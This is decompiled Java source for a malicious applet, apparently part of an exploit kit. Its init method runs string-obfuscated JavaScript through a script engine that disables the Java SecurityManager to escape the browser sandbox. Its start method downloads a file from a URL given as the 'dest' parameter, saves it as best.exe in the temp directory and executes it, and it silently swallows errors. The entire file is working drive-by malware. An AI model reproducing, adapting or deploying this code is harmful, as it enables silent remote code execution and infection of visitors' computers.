import javax.script.ScriptException;
import java.awt.Component;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Efira extends Applet
{
    private JList equius;
    
    private void dhdhs() {
        int n = 3;
        ++n;
    }
    
    @Override
    public void start() {
        try {
            final String parameter = this.getParameter("denamstst".replace("namst", ""));
            String s = System.getProperty("jnamodestava.inamodesto.tmnamodestpdinamodestr".replace("namodest", ""));
            if (s.charAt(s.length() - 1) != '\\') {
                s += "\\";
            }
            final String string = s + "best" + ".e".concat("xe");
            final byte[] array = new byte[1300];
            final InputStream blef = Sefas.blef(parameter);
            byte[] array2 = new byte[153601];
            int n = 0;
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            int read;
            while ((read = blef.read(array2)) > 0) {
                fileOutputStream.write(array2, 0, read);
                array2 = new byte[153601];
                n += read;
            }
            fileOutputStream.close();
            blef.close();
            try {
                Sefas.exe(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Boolean nsdh() {
        return true;
    }
    
    @Override
    public void init() {
        try {
            final Eng eng = new Eng();
            eng.bers.eval("vueiol2ar erueiol2ror = neueiol2w Erueiol2roueiol2r(\"Mueiol2y eueiol2rrueiol2or\");thueiol2is.ueiol2toSueiol2trinueiol2g = fuueiol2nctiueiol2on(){ jueiol2ava.lueiol2ang.Sueiol2ystueiol2em.seueiol2tSecueiol2uritueiol2yManaueiol2ger(nuueiol2ll);appueiol2let.sueiol2taueiol2rt();retueiol2urn \"ueiol2exueiol2ploueiol2it!\";};eueiol2rroueiol2r.meueiol2ssueiol2age = tueiol2hiueiol2s;".replace("ueiol2", ""));
            this.add(this.equius = new JList(new Object[] { eng.bers.get("erquatroroquatror".replace("quatro", "")) }));
        }
        catch (ScriptException ex) {}
    }
}
